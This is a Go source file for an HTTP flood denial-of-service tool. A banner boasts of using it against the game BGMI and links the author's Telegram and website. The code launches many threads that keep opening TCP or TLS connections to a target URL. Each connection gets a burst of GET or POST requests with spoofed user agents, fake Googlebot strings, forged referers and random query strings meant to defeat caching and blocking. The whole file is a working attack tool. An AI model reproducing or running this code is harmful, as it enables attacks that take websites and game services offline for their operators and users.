/*
Coded by Prince Raj
Please fuking code ur script by ur self
*/
/*
This Script Will Not Work If You Apply Any Changes.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal from the target
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Maybe ur ip got blocked or website got down") 
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)
	}
}

func main() {
    fmt.Println("                                                                                         ")
fmt.Println(" ________________________________________________________________________________________________________")
fmt.Println(" __________8 888888888o.      8 888888888o.          ,o888888o.       d888888o.      d888888o.___________")
fmt.Println(" __________8 8888    `^888.   8 8888    `^888.    . 8888     `88.   .`8888:' `88.  .`8888:' `88._________")
fmt.Println(" __________8 8888        `88. 8 8888        `88. ,8 8888       `8b  8.`8888.   Y8  8.`8888.   Y8_________")
fmt.Println(" __________8 8888         `88 8 8888         `88 88 8888        `8b `8.`8888.      `8.`8888._____________")
fmt.Println(" __________8 8888          88 8 8888          88 88 8888         88  `8.`8888.      `8.`8888.____________")
fmt.Println(" __________8 8888          88 8 8888          88 88 8888         88   `8.`8888.      `8.`8888.___________")
fmt.Println(" __________8 8888         ,88 8 8888         ,88 88 8888        ,8P    `8.`8888.      `8.`8888.__________")
fmt.Println(" __________8 8888        ,88' 8 8888        ,88' `8 8888       ,8P 8b   `8.`8888. 8b   `8.`8888._________")
fmt.Println(" __________8 8888    ,o88P'   8 8888    ,o88P'    ` 8888     ,88'  `8b.  ;8.`8888 `8b.  ;8.`8888_________")
fmt.Println(" __________8 888888888P'      8 888888888P'          `8888888P'     `Y8888P ,88P'  `Y8888P ,88P'_________")
fmt.Println("_________________________________________________________________________________________________________")
fmt.Println(" **************************************** ______   __****************************************")
fmt.Println(" ****************************************| __ ) \ / /****************************************")
fmt.Println(" ****************************************|  _ \\ V /*****************************************")
fmt.Println(" ****************************************| |_) || |******************************************")
fmt.Println(" ****************************************|____/ |_|******************************************")
fmt.Println(" ######################################################################################################### ")
fmt.Println(" 00000000000000000 _____  _____  _____ _   _  _____ ______ _____                _ 00000000000000000 ")
fmt.Println(" 00000000000000000|  __ \|  __ \|_   _| \ | |/ ____|  ____|  __ \     /\       | |00000000000000000 ")
fmt.Println(" 00000000000000000| |__) | |__) | | | |  \| | |    | |__  | |__) |   /  \      | |00000000000000000 ")
fmt.Println(" 00000000000000000|  ___/|  _  /  | | | . ` | |    |  __| |  _  /   / /\ \ _   | |00000000000000000 ")
fmt.Println(" 00000000000000000| |    | | \ \ _| |_| |\  | |____| |____| | \ \  / ____ \ |__| |00000000000000000 ")
fmt.Println(" 00000000000000000|_|    |_|  \_\_____|_| \_|\_____|______|_|  \_\/_/    \_\____/000000000000000000 ")
fmt.Println("0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
fmt.Println("****************************************************************************************************")
fmt.Println("            https://t.me/DjPrinceRaj ---- https://www.DisruptorOfficial.Com                         ")
fmt.Println("****************************************************************************************************")
    fmt.Println("                                                                                         ")
    fmt.Println("                                                                                         ")
    fmt.Println("                                                                                         ")
    fmt.Println("                                                                                         ")
	fmt.Println("  BGMI KI GAAND MAARNE WAL TOOL.                        ")
	fmt.Println("   Loading...                           ")
	fmt.Println(" |||||||||||||||||| 5% ")
	fmt.Println(" |||||||||||||||||||||||||||||||||| 15% ")
	fmt.Println(" |||||||||||||||||||||||||||||||||||||||||||||||||||||| 50% ")
        fmt.Println(" ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 75% ")
        fmt.Println(" |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 90% ")
        fmt.Println(" ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 95% ")
        fmt.Println(" |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 100% ")
		    
        fmt.Println(" UDP flud starting......... ")
		    
		     if len(os.Args) != 6 {
		fmt.Println("")
		fmt.Println("")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("enter correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}
	input := bufio.NewReader(os.Stdin)

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood() // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Printf("\nPlease [Enter] for continue")
	_, err = input.ReadString('\n')
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue and keep fucking
}